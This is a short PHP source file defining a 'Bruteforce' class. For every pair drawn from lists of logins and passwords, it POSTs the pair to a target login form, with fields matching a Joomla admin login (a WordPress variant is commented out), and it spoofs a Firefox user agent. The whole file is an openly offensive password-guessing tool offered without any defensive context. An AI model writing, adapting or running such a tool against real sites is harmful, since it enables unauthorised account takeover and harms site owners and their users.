<?php

/**
 * Created by PhpStorm.
 * User: Lalka
 * Date: 03.05.2016
 * Time: 16:03
 */
class Bruteforce
{
    function __construct($target, $scid)
    {
        $this->target = $target;
        $this->ch = curl_init();
        $this->scid = $scid;
        print_r($this);
        //echo 123;
    }

    function startBruteforce($logins, $passwords)
    {

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->target);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_NOBODY, 1);
        foreach ($logins as $login) {
            foreach ($passwords as $password) {
                //curl_setopt($ch,CURLOPT_POSTFIELDS,"log=$login&pwd=$password");
                curl_setopt($ch, CURLOPT_POSTFIELDS, "username=$login&passwd=$password&task=login");
                echo curl_getinfo($ch, CURLINFO_HTTP_CODE) . "\n";
                curl_exec($ch);
            }
        }
        curl_close($ch);


    }

}